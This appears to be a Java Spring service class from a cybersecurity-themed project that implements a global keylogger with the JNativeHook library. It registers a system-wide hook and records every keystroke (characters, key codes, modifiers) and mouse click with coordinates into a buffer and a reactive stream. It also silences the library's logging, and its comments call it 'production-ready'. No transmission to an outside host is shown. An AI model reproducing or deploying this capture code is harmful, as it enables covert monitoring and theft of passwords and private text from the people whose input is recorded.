package com.codexraziel.cybersec.services.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;
import lombok.Builder;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Sinks;

import jakarta.annotation.PostConstruct;
import jakarta.annotation.PreDestroy;
import java.time.Instant;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Professional keylogger service using JNativeHook
 * Cross-platform, stable, and production-ready
 */
@Slf4j
@Service
public class NativeKeyloggerService implements NativeKeyListener, NativeMouseListener {
    
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong eventCounter = new AtomicLong(0);
    
    private final Queue<KeyEvent> eventBuffer = new ConcurrentLinkedQueue<>();
    private final Sinks.Many<KeyEvent> eventSink = Sinks.many().multicast().onBackpressureBuffer();
    
    private static final int MAX_BUFFER_SIZE = 10_000;
    
    /**
     * Initialize JNativeHook (suppress its logging)
     */
    @PostConstruct
    public void initialize() {
        // Disable JNativeHook logging
        Logger nativeHookLogger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        nativeHookLogger.setLevel(Level.OFF);
        nativeHookLogger.setUseParentHandlers(false);
        
        log.info("NativeKeyloggerService initialized (JNativeHook v2.2.2)");
    }
    
    /**
     * Start capturing keyboard and mouse events
     */
    public void start() {
        if (running.compareAndSet(false, true)) {
            try {
                GlobalScreen.registerNativeHook();
                GlobalScreen.addNativeKeyListener(this);
                GlobalScreen.addNativeMouseListener(this);
                
                log.info("Keylogger started successfully");
            } catch (NativeHookException e) {
                running.set(false);
                log.error("Failed to start keylogger", e);
                throw new RuntimeException("Could not register native hook", e);
            }
        } else {
            log.warn("Keylogger is already running");
        }
    }
    
    /**
     * Stop capturing events
     */
    public void stop() {
        if (running.compareAndSet(true, false)) {
            try {
                GlobalScreen.removeNativeKeyListener(this);
                GlobalScreen.removeNativeMouseListener(this);
                GlobalScreen.unregisterNativeHook();
                
                log.info("Keylogger stopped. Total events captured: {}", eventCounter.get());
            } catch (NativeHookException e) {
                log.error("Error while stopping keylogger", e);
            }
        }
    }
    
    /**
     * Get reactive stream of events (Reactor Flux)
     */
    public Flux<KeyEvent> getEventStream() {
        return eventSink.asFlux();
    }
    
    /**
     * Get current event count
     */
    public long getEventCount() {
        return eventCounter.get();
    }
    
    /**
     * Check if keylogger is running
     */
    public boolean isRunning() {
        return running.get();
    }
    
    /**
     * Get buffered events and clear buffer
     */
    public Queue<KeyEvent> consumeBuffer() {
        Queue<KeyEvent> events = new ConcurrentLinkedQueue<>(eventBuffer);
        eventBuffer.clear();
        return events;
    }
    
    /**
     * Clear event buffer
     */
    public void clearBuffer() {
        eventBuffer.clear();
        log.debug("Event buffer cleared");
    }
    
    // NativeKeyListener implementation
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (!running.get()) return;
        
        KeyEvent event = KeyEvent.builder()
                .timestamp(Instant.now())
                .type(EventType.KEY_PRESSED)
                .keyCode(e.getKeyCode())
                .keyText(NativeKeyEvent.getKeyText(e.getKeyCode()))
                .keyChar(e.getKeyChar())
                .modifiers(getModifiersText(e.getModifiers()))
                .rawCode(e.getRawCode())
                .build();
        
        processEvent(event);
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (!running.get()) return;
        
        KeyEvent event = KeyEvent.builder()
                .timestamp(Instant.now())
                .type(EventType.KEY_RELEASED)
                .keyCode(e.getKeyCode())
                .keyText(NativeKeyEvent.getKeyText(e.getKeyCode()))
                .keyChar(e.getKeyChar())
                .modifiers(getModifiersText(e.getModifiers()))
                .rawCode(e.getRawCode())
                .build();
        
        processEvent(event);
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        if (!running.get()) return;
        
        KeyEvent event = KeyEvent.builder()
                .timestamp(Instant.now())
                .type(EventType.KEY_TYPED)
                .keyCode(e.getKeyCode())
                .keyText(NativeKeyEvent.getKeyText(e.getKeyCode()))
                .keyChar(e.getKeyChar())
                .modifiers(getModifiersText(e.getModifiers()))
                .rawCode(e.getRawCode())
                .build();
        
        processEvent(event);
    }
    
    // NativeMouseListener implementation
    
    @Override
    public void nativeMouseClicked(NativeMouseEvent e) {
        if (!running.get()) return;
        
        KeyEvent event = KeyEvent.builder()
                .timestamp(Instant.now())
                .type(EventType.MOUSE_CLICKED)
                .mouseButton(e.getButton())
                .mouseX(e.getX())
                .mouseY(e.getY())
                .clickCount(e.getClickCount())
                .build();
        
        processEvent(event);
    }
    
    @Override
    public void nativeMousePressed(NativeMouseEvent e) {
        // Opcional: capturar mouse press
    }
    
    @Override
    public void nativeMouseReleased(NativeMouseEvent e) {
        // Opcional: capturar mouse release
    }
    
    // Event processing
    
    private void processEvent(KeyEvent event) {
        eventCounter.incrementAndGet();
        
        // Add to buffer (circular - remove oldest if full)
        if (eventBuffer.size() >= MAX_BUFFER_SIZE) {
            eventBuffer.poll();
        }
        eventBuffer.offer(event);
        
        // Emit to reactive stream
        eventSink.tryEmitNext(event);
        
        // Log for debugging (can be disabled in production)
        if (log.isTraceEnabled()) {
            log.trace("Event: {}", event);
        }
    }
    
    private String getModifiersText(int modifiers) {
        StringBuilder sb = new StringBuilder();
        
        if ((modifiers & NativeKeyEvent.CTRL_MASK) != 0) {
            sb.append("Ctrl+");
        }
        if ((modifiers & NativeKeyEvent.SHIFT_MASK) != 0) {
            sb.append("Shift+");
        }
        if ((modifiers & NativeKeyEvent.ALT_MASK) != 0) {
            sb.append("Alt+");
        }
        if ((modifiers & NativeKeyEvent.META_MASK) != 0) {
            sb.append("Meta+");
        }
        
        // Remove trailing '+'
        if (sb.length() > 0) {
            sb.setLength(sb.length() - 1);
        }
        
        return sb.toString();
    }
    
    @PreDestroy
    public void cleanup() {
        if (running.get()) {
            stop();
        }
        log.info("NativeKeyloggerService destroyed");
    }
    
    // Event model
    
    @Data
    @Builder
    public static class KeyEvent {
        private Instant timestamp;
        private EventType type;
        
        // Keyboard fields
        private int keyCode;
        private String keyText;
        private char keyChar;
        private String modifiers;
        private int rawCode;
        
        // Mouse fields
        private int mouseButton;
        private int mouseX;
        private int mouseY;
        private int clickCount;
        
        /**
         * Get readable representation
         */
        public String toReadableString() {
            if (type.name().startsWith("KEY_")) {
                String mod = modifiers != null && !modifiers.isEmpty() ? modifiers + "+" : "";
                return String.format("[%s] %s%s", type, mod, keyText);
            } else {
                return String.format("[%s] Button %d at (%d,%d)", type, mouseButton, mouseX, mouseY);
            }
        }
    }
    
    public enum EventType {
        KEY_PRESSED,
        KEY_RELEASED,
        KEY_TYPED,
        MOUSE_CLICKED,
        MOUSE_PRESSED,
        MOUSE_RELEASED,
        MOUSE_MOVED
    }
    
    /**
     * Statistics about captured events
     */
    @Data
    @Builder
    public static class Statistics {
        private long totalEvents;
        private long keyEvents;
        private long mouseEvents;
        private long bufferSize;
        private Instant startedAt;
        private boolean running;
    }
    
    /**
     * Get current statistics
     */
    public Statistics getStatistics() {
        long total = eventCounter.get();
        long bufferSize = eventBuffer.size();
        
        // Count key vs mouse events in buffer
        long keyEvents = eventBuffer.stream()
                .filter(e -> e.getType().name().startsWith("KEY_"))
                .count();
        
        return Statistics.builder()
                .totalEvents(total)
                .keyEvents(keyEvents)
                .mouseEvents(bufferSize - keyEvents)
                .bufferSize(bufferSize)
                .running(running.get())
                .build();
    }
}
